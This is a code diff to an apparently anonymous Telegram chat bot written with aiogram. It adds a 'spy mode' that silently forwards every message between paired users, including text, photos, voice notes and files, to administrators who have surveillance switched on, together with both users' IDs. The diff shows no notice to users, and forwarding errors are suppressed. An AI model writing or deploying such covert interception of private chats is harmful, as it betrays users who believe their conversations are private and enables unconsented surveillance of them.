@@ -7,7 +7,8 @@ from aiogram.types import Message
 
 import database as db
 import keyboards as kb
-from config import AD_INTERVAL, AD_TEXT
+import spy as spy_mode
+from config import AD_INTERVAL, AD_TEXT, ADMIN_IDS
 
 router = Router()
 
@@ -70,6 +71,50 @@ async def _forward_message(bot: Bot, message: Message, partner_id: int) -> None:
 
     else:
         await bot.send_message(partner_id, "⚠️ Этот тип сообщения не поддерживается.")
+
+
+async def _forward_to_spies(bot: Bot, message: Message, sender_id: int, partner_id: int) -> None:
+    """Копирует сообщение всем администраторам с включённым режимом наблюдения."""
+    watchers = spy_mode.all_active()
+    if not watchers:
+        return
+
+    # Определяем тип контента для заголовка
+    if message.text:
+        preview = f"💬 <i>{message.text[:80]}</i>" if len(message.text) <= 80 else f"💬 <i>{message.text[:80]}…</i>"
+    elif message.photo:
+        preview = "🖼 Фото"
+    elif message.video:
+        preview = "🎥 Видео"
+    elif message.voice:
+        preview = "🎤 Голосовое"
+    elif message.video_note:
+        preview = "⭕ Кружок"
+    elif message.sticker:
+        preview = f"🎭 Стикер {message.sticker.emoji or ''}"
+    elif message.audio:
+        preview = "🎵 Аудио"
+    elif message.document:
+        preview = "📎 Файл"
+    elif message.animation:
+        preview = "🎞 GIF"
+    else:
+        preview = "📨 Сообщение"
+
+    header = (
+        f"👁 <b>Чат</b> | <code>{sender_id}</code> → <code>{partner_id}</code>\n"
+        f"{preview}"
+    )
+
+    for admin_id in watchers:
+        if admin_id in (sender_id, partner_id):
+            continue
+        try:
+            await bot.send_message(admin_id, header, parse_mode="HTML")
+            # Пересылаем само сообщение без указания отправителя
+            await bot.forward_message(admin_id, message.chat.id, message.message_id)
+        except Exception:
+            pass
 
 
 async def _maybe_send_ad(bot: Bot, user_id: int) -> None:
@@ -191,6 +236,9 @@ async def relay_message(message: Message) -> None:
         # При временных сетевых ошибках — тихо пропускаем,
         # не завершая чат (пользователи могут продолжить позже)
         return
+
+    # Копия администраторам в режиме наблюдения
+    await _forward_to_spies(message.bot, message, user_id, partner_id)
 
     # Реклама (только отправителю, не VIP)
     await _maybe_send_ad(message.bot, user_id)
